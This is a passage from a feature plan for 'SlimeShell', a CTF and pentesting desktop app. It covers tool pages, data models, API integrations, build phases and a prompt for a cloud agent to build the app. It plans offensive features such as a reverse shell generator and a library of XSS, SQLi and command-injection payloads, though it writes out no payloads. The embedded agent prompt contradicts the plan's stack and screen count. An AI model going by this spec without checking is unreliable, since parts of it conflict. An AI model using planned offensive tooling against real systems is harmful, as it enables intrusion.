- Code input area (left)
- Output area (right)
- stdin input for programs that read input
- "Run" button
- Memory state visualization (for Brainfuck: show the tape and pointer)

---

### 23. HTTP Request Builder (`/http`)
**Designed: YES** — Paper artboard "SlimeShell — HTTP Builder"

Craft and send custom HTTP requests (like Postman/Insomnia but minimal).

**Features:**
- Method selector: GET, POST, PUT, DELETE, PATCH, OPTIONS, HEAD
- URL input
- Headers editor (key-value pairs, add/remove)
- Body editor (raw, JSON, form-data)
- Query params editor
- Auth helpers: Bearer token, Basic auth, Cookie
- Send button
- Response panel: status code, headers, body (pretty-printed), timing

---

### 24. Frequency Analysis (`/frequency` — or sub-page of Utilities)
**Designed: NO**

For classical cipher analysis.

**Features:**
- Text input
- Letter frequency bar chart (compare to English baseline)
- Bigram/trigram frequency
- Index of Coincidence calculation
- Kasiski examination (for Vigenere key length detection)
- Auto-suggest: "This looks like a Caesar cipher with shift 13" or "Vigenere with key length 5"

---

### 25. Image Channel Viewer (sub-page of File Analyzer)
**Designed: NO**

Split images into color channels for steganography.

**Features:**
- Upload image
- View individual channels: Red, Green, Blue, Alpha
- Bit plane extraction (LSB, MSB)
- Brightness/contrast adjustment
- Histogram visualization
- Side-by-side comparison mode

---

## Pages & Features — Productivity & Meta

### 26. Command Palette
**Not a page — global overlay triggered by Ctrl+K / Cmd+K**

Quick-search everything in SlimeShell.

**Features:**
- Fuzzy search across: pages, tools, scripts, payloads, references, writeups, recent actions
- Keyboard navigable (arrow keys + enter)
- Categories shown with icons
- Recent items at top
- Actions: navigate to page, copy payload, run tool, open script

**Implementation**: Use `cmdk` library (https://cmdk.paco.me/) or build custom.

---

### 27. Clipboard History
**Not a page — sidebar panel or floating widget**

Track everything copied from SlimeShell.

**Features:**
- Auto-captures every "copy" action from CopyButtons
- Shows: content preview (truncated), source (which tool/page), timestamp
- Click to re-copy
- Search within history
- Pin important items
- Max 100 items, auto-prune old ones

**Storage**: Zustand store + localStorage.

---

### 28. Notes / Wiki (`/notes`)
**Designed: YES** — Paper artboard "SlimeShell — Notes & Wiki"

Obsidian-style linked notes for hacking knowledge.

**Features:**
- Create/edit/delete notes in Markdown
- Folder structure or flat with tags
- Wiki-style links: `[[note-name]]` auto-links to other notes
- Backlinks panel: "Notes that link to this one"
- Tag system: #web, #crypto, #htb, #privesc
- Full-text search
- Attach to CTFs/machines: notes can reference a CTF or writeup
- Template support: Machine template (IP, OS, Ports, Foothold, PrivEsc, Flags, Notes)

**Storage**: Markdown files in `~/.slimeshell/notes/`.

---

### 29. Notification Center
**Global component — bell icon in sidebar or top bar**

**Triggers:**
- CTF starting soon (from CTFtime data)
- Challenge timer exceeded threshold (>2hr on a "Baby" challenge)
- Teammate captured a flag (collab mode)
- VPN disconnected
- Flipper Zero disconnected
- Scheduled reminders

---

### 30. Bookmarks (`/bookmarks`)
**Designed: YES** — Paper artboard "SlimeShell — Bookmarks"

Save and organize useful URLs.

**Features:**
- Add bookmark: URL, title, tags, notes
- Auto-fetch page title and favicon
- Tag-based filtering
- Folders: CTF Resources, Tools, Blogs, Writeups, Documentation
- Import/export
- Quick access from Command Palette

---

### 31. Settings (`/settings`)
**Designed: YES** — Paper artboard "SlimeShell — Settings"

App configuration.

**Sections:**
- **Profile**: Username, avatar, bio
- **API Keys**: Shodan, SecurityTrails, VirusTotal, CTFtime — stored encrypted
- **Theme**: Color scheme selector (SlimeShell Default, Matrix, Dracula, Cyberpunk, Ocean)
- **Terminal**: Default shell, font size, scrollback buffer
- **Integrations**: Flipper Zero serial port, VPN config paths
- **Data**: Import/export all data as JSON backup, clear data
- **Keyboard Shortcuts**: View and customize shortcuts
- **About**: Version, credits, links

---

### 32. Collab Mode (`/collab`)
**Designed: YES** — Paper artboard "SlimeShell — Collab Mode"

Real-time team collaboration during CTFs.

**Features:**
- **Shared Scoreboard**: Team members' scores synced in real-time
- **Chat**: Simple real-time chat with code block support
- **Challenge Assignment**: Assign challenges to team members, track who's working on what
- **Flag Sharing**: Announce flag captures to the team
- **Shared Notes**: Collaborative notes per challenge
- **Cursor Presence**: See who's looking at what page (like Figma cursors)

**Implementation**: WebSocket server (Socket.io or ws), or use a hosted service like Liveblocks/Supabase Realtime.

---

### 33. Diff Tool (`/diff`)
**Designed: YES** — Paper artboard "SlimeShell — Diff Tool"

Compare two texts/files side by side.

**Features:**
- Two text input areas
- Side-by-side diff view with highlighted changes
- Inline diff view (unified)
- Line-by-line comparison
- Hex diff mode for binary comparison
- Ignore whitespace option

---

### 34. QR Code Tool (sub-page of Utilities)
**Designed: NO**

Generate and read QR codes.

**Features:**
- **Generate**: Text input → QR code image, downloadable
- **Read**: Upload image or use webcam → decoded text
- Custom colors, size, error correction level

---

### 35. Timestamp Converter (sub-page of Utilities)
**Designed: NO**

Convert between timestamp formats.

**Features:**
- Input: Unix timestamp, ISO 8601, RFC 2822, human-readable
- Output: All formats simultaneously
- Current time button
- Timezone selector
- "X time ago" relative display

---

### 36. Email Header Analyzer (sub-page of OSINT)
**Designed: NO**

Analyze email headers for phishing investigation.

**Features:**
- Paste full email headers
- Parse: sender, recipient, relay chain, SPF/DKIM/DMARC results
- Visual hop-by-hop trace
- Flag suspicious indicators (spoofed sender, failed auth, unusual routing)
- Geolocation of relay IPs

---

### 37. Regex Tester (`/regex`)
**Designed: YES** — Paper artboard "SlimeShell — Regex Tester"

Test regular expressions with live matching.

**Features:**
- Pattern input with flags (g, i, m, s)
- Test string input (multi-line)
- Live highlighting of matches
- Match groups breakdown
- Common regex library (email, IP, URL, hex, base64)
- Explanation of pattern (describe what each part does)

---

### 38. Log Parser (sub-page of Utilities or standalone)
**Designed: NO**

Parse and search through log files.

**Features:**
- Upload or paste log content
- Auto-detect format (Apache, Nginx, syslog, auth.log, JSON)
- Regex-powered search with highlighting
- Filter by log level (ERROR, WARN, INFO, DEBUG)
- Timeline visualization
- Extract IPs, URLs, usernames from logs
- Export filtered results

---

## Data Models

### CTF
```js
{
  id: string,
  name: string,
  platform: 'HTB' | 'THM' | 'picoCTF' | 'CTFtime' | 'custom',
  url: string,
  startDate: Date,
  endDate: Date,
  status: 'upcoming' | 'active' | 'completed',
  challenges: Challenge[],
  score: number,
  rank: number,
  team: string[],
  notes: string
}
```

### Challenge
```js
{
  id: string,
  ctfId: string,
  name: string,
  category: 'Web' | 'Crypto' | 'Pwn' | 'Rev' | 'Forensics' | 'Stego' | 'Misc' | 'OSINT',
  difficulty: 'Baby' | 'Easy' | 'Medium' | 'Hard' | 'Insane',
  points: number,
  status: 'todo' | 'wip' | 'captured',
  flag: string,
  timeSpent: number, // seconds
  solver: string,
  notes: string
}
```

### Script
```js
{
  id: string,
  filename: string,
  language: 'python' | 'bash' | 'javascript' | 'php' | 'ruby' | 'perl' | 'powershell' | 'other',
  content: string,
  description: string,
  tags: string[],
  createdAt: Date,
  updatedAt: Date,
  runCount: number
}
```

### Writeup
```js
{
  id: string,
  title: string,
  ctfName: string,
  challengeName: string,
  category: string,
  difficulty: string,
  content: string, // Markdown
  tags: string[],
  createdAt: Date,
  updatedAt: Date,
  published: boolean
}
```

### Payload
```js
{
  id: string,
  title: string,
  category: 'XSS' | 'SQLi' | 'SSTI' | 'LFI' | 'RFI' | 'CMDi' | 'SSRF' | 'XXE' | 'Upload' | 'LDAP',
  payload: string,
  description: string,
  tags: string[],
  copyCount: number
}
```

### Profile
```js
{
  username: string,
  avatar: string, // gradient colors or image URL
  level: number,
  xp: number,
  rank: 'n00b' | 'script kiddie' | 'hacker' | 'elite' | 'l33t' | 'god',
  stats: {
    flagsCaptured: number,
    ctfsCompleted: number,
    writeupsWritten: number,
    scriptsSaved: number,
    toolsUsed: number
  },
  categoryBreakdown: { [category: string]: number },
  activityHeatmap: { [dateString: string]: number }, // "2025-03-18": 5
  joinedDate: Date
}
```

### Bookmark
```js
{
  id: string,
  url: string,
  title: string,
  description: string,
  favicon: string,
  tags: string[],
  folder: string,
  createdAt: Date
}
```

### Note
```js
{
  id: string,
  title: string,
  content: string, // Markdown with [[wiki-links]]
  tags: string[],
  linkedCTF: string, // optional CTF id
  backlinks: string[], // note ids that link to this
  createdAt: Date,
  updatedAt: Date
}
```

---

## API Integrations

| Service | Purpose | Key Required | Free Tier |
|---------|---------|-------------|-----------|
| **CTFtime.org** | Upcoming CTFs, team rankings | No (public API) | Yes |
| **Shodan** | Host/port scanning, CVE lookup | Yes | 100 queries/month free |
| **SecurityTrails** | DNS history, subdomains | Yes | 50 queries/month free |
| **VirusTotal** | File/URL scanning | Yes | 500 requests/day free |
| **ExploitDB** | Exploit search | No (searchsploit CLI) | Yes |
| **NVD/NIST** | CVE database | No (public API) | Yes |
| **Have I Been Pwned** | Breach checking | Yes | Free for search |
| **ip-api.com** | IP geolocation | No | 45 req/min free |
| **Flipper Zero** | Device serial comms | No (USB/BT) | N/A |

---

## Build Priority & Phases

### Phase 1 — Foundation (Week 1-2)
Get the app running with core layout and navigation.

- [ ] Tauri 2 project init (`pnpm create tauri-app` with Vite + React + JavaScript)
- [ ] Tailwind config with SlimeShell color palette and fonts
- [ ] Bundle JetBrains Mono + Space Grotesk fonts
- [ ] React Router setup with all 29 routes
- [ ] Sidebar component with all navigation items
- [ ] Top bar component
- [ ] Shared UI components (Card, Button, Badge, Input, CodeBlock, CopyButton, Toggle, Tabs)
- [ ] Dashboard page (stats cards, quick tools grid)
- [ ] Command Palette (Cmd+K) using `cmdk` library
- [ ] Rust: SQLite setup with migrations (tauri-plugin-sql)
- [ ] Rust: basic file system commands (read_file, write_file, list_dir)
- [ ] useBackend hook for Tauri invoke abstraction

### Phase 2 — Core Tools (Week 3-4)
Build the most-used tool pages.

- [ ] Encoding Playground (chain encoder/decoder)
- [ ] Reverse Shell Generator
- [ ] Utilities page (Hash Gen, Subnet Calc, Port Ref, Flag Fmt, ASCII Art)
- [ ] References page (cheatsheets, commands)
- [ ] Payloads library

### Phase 3 — Content Management (Week 5-6)
File-based content pages.

- [ ] Scripts page (file manager + Monaco editor)
- [ ] Writeups page (Markdown editor + preview)
- [ ] Notes/Wiki page (linked markdown)
- [ ] Wordlist Manager

### Phase 4 — CTF Features (Week 7-8)
Competition tracking and gamification.

- [ ] CTFs page (active + completed tracking)
- [ ] CTFtime integration (upcoming CTFs, countdowns)
- [ ] Challenge Timer
- [ ] Team Scoreboard
- [ ] Profile & Stats (XP, levels, heatmap)

### Phase 5 — Advanced Tools (Week 9-10)
Deeper technical tools.

- [ ] Rust: PTY spawning commands (portable-pty crate)
- [ ] Terminal page (xterm.js frontend + Rust PTY backend via IPC events)
- [ ] Rust: OSINT proxy commands (reqwest HTTP client for Shodan, WHOIS, DNS)
- [ ] OSINT & Recon page
- [ ] Report Generator (PDF export via printpdf or browser print)
- [ ] JWT Debugger (client-side)
- [ ] File Analyzer (client-side FileReader + Rust for deeper analysis)
- [ ] HTTP Request Builder (Rust reqwest for actual requests — no CORS)

### Phase 6 — Native Integrations (Week 11-12)
Leverage Tauri's native capabilities.

- [ ] Rust: VPN process management (spawn/kill openvpn, read tun0 IP)
- [ ] VPN Manager page
- [ ] Rust: Serial port commands (tauri-plugin-serialplugin for Flipper Zero)
- [ ] Flipper Zero integration page
- [ ] Network Map Builder (import nmap XML via Rust FS)
- [ ] Bookmarks page

### Phase 7 — Polish & Social (Week 13+)
Final features and future web prep.

- [ ] Collab Mode (WebSocket via Rust backend or external service)
- [ ] Notification Center (Tauri native notifications)
- [ ] Esoteric Language Interpreter (client-side)
- [ ] Regex Tester (client-side)
- [ ] Diff Tool (client-side)
- [ ] Theme Customizer
- [ ] Clipboard History
- [ ] Settings page (API key storage via Tauri secure store)
- [ ] Keyboard shortcuts (Tauri global shortcuts)
- [ ] Plugin System architecture
- [ ] Tauri auto-updater setup
- [ ] Future: Axum web server mode for remote access

---

## Paper Design Reference

All 29 screens + 1 Design System page are designed in Paper Design:

| Artboard Name | Page | Status |
|--------------|------|--------|
| SlimeShell — Dashboard | `/` | Designed |
| SlimeShell — Tools Page | `/tools` | Designed |
| SlimeShell — References | `/references` | Designed |
| SlimeShell — Scripts | `/scripts` | Designed |
| SlimeShell — Flipper Zero | `/flipper` | Designed |
| SlimeShell — CTFs | `/ctfs` | Designed |
| SlimeShell — Writeups | `/writeups` | Designed |
| SlimeShell — Payloads | `/payloads` | Designed |
| SlimeShell — Encoding Playground | `/encoding` | Designed |
| SlimeShell — Reverse Shell Gen | `/revshell` | Designed |
| SlimeShell — OSINT & Recon | `/osint` | Designed |
| SlimeShell — Terminal | `/terminal` | Designed |
| SlimeShell — Profile & Stats | `/profile` | Designed |
| SlimeShell — Report Generator | `/reports` | Designed |
| SlimeShell — Utilities | `/utilities` | Designed |
| SlimeShell — Wordlist Manager | `/wordlists` | Designed |
| SlimeShell — CTFtime & Scoreboard | `/ctftime` | Designed |
| SlimeShell — JWT Debugger | `/jwt` | Designed |
| SlimeShell — File Analyzer | `/file-analyzer` | Designed |
| SlimeShell — Notes & Wiki | `/notes` | Designed |
| SlimeShell — Network Map | `/network-map` | Designed |
| SlimeShell — VPN Manager | `/vpn` | Designed |
| SlimeShell — HTTP Builder | `/http` | Designed |
| SlimeShell — Collab Mode | `/collab` | Designed |
| SlimeShell — Settings | `/settings` | Designed |
| SlimeShell — Bookmarks | `/bookmarks` | Designed |
| SlimeShell — Esoteric Languages | `/esoteric` | Designed |
| SlimeShell — Regex Tester | `/regex` | Designed |
| SlimeShell — Diff Tool | `/diff` | Designed |
| SlimeShell — Design System | (reference) | Designed |

All pages are fully designed — use the Design System artboard as the visual reference for building components.

---

## Agent Build Prompt

When giving this to a cloud agent to build, use this context:

```
You are building SlimeShell — a self-hosted CTF & pentesting web app.

CRITICAL CONTEXT:
- Read SLIMESHELL-PLAN.md for the COMPLETE feature spec, tech stack, architecture, and design system
- The app has 17 screens designed in Paper Design — follow the design system exactly
- Use Next.js 14+ App Router with JavaScript (NOT TypeScript)
- Use Tailwind CSS with the exact color palette from the design system
- Use pnpm as package manager
- Fonts: JetBrains Mono (monospace) + Space Grotesk (headings) from Google Fonts
- The app is self-hosted, single-user, offline-first where possible
- All encoding/hashing/crypto tools run CLIENT-SIDE (no API calls needed)
- Terminal uses xterm.js + node-pty
- Data persists in SQLite or localStorage
- Follow the phased build order in the plan

DESIGN RULES:
- Background: #141820, Sidebar: #11151E, Cards: #1A1F2E, Code: #0F1520
- Primary accent: #6EE7B7 (mint green)
- No emojis as icons — use Lucide React icons or SVGs
- All interactive elements need hover states
- Copy buttons everywhere — this is a tool app, everything should be copyable
- Consistent sidebar on every page with active state highlighting

START WITH:
Phase 1 — Foundation: project setup, layout, sidebar, dashboard, command palette
Then Phase 2 — Core Tools: encoding, revshell, utilities, references, payloads
```

---

*Last updated: 2026-03-18*
*Created by: Luca Vandenweghe (MrGreenSlime)*
*Design tool: Paper Design (30 artboards — 29 pages + 1 design system)*
